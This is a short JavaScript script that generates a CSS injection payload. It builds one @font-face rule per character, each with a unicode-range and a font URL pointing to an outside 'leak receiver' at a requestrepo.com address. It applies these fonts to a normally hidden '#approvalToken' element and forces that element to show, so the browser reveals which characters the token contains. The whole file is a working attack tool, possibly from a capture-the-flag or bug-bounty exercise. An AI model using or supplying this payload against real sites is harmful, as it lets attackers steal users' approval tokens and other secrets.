// The target element you'd like to extract text from
const target_element = `#approvalToken`;

// Any additional CSS you'd like to inject for the target element
// In this case, we're making sure the element is visible as it is hidden by default
const extra_css = `display: block !important;`;

// Configurable font name prefix to avoid collisions with existing fonts 
const font_prefix = 'f_';

// Leak receiver endpoint
const endpoint = `//newi7t6m.requestrepo.com?c=`

// Configurable dictionary of characters to check for the presence of
const dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

// Create an array of objects for each character in the dictionary
// Each object contains the character, the font name, and the unicode value. 
let chars = dict.split('').map((c) => ({ key: c, font_name: `${font_prefix}${c}`, unicode_val: `U+${c.charCodeAt(0).toString(16).toUpperCase()}`}));

// Create the font face rules for each character in the dictionary
const initial_css = chars.map(c => `@font-face{font-family:'${font_prefix}${c.key}';src:url('${endpoint}${c.key}');unicode-range:${c.unicode_val} }`);

// Create the CSS rule to apply the font family to the target element for each character in the dictionary
// Also appends the extra CSS to the rule, just in case.
initial_css.push(`${target_element}{font-family:${chars.map(c => `'${c.font_name}'`)}; ${extra_css}}`);

let css = initial_css.join('\n');

// Output the generated CSS
console.log(css);
